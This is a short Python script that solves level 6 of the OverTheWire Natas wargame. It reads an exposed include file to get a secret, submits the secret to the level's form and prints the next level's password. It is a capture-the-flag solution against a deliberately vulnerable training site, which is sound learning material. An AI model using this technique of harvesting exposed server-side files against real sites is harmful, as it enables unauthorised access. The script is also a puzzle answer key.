#! /usr/bin/python

import requests
import re

username = 'natas6'
password = ''

r = requests.get('http://natas6.natas.labs.overthewire.org/includes/secret.inc', auth=(username, password))
pattern = r'\$secret = \"(\w+)\";'
result = re.search(pattern, str(r.content))
secret = result.group(1)

payload = {'secret':secret, 'submit':'submit'}
r = requests.post('http://natas6.natas.labs.overthewire.org/', auth=(username, password), data=payload)
pattern = r'The password for natas7 is (\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)

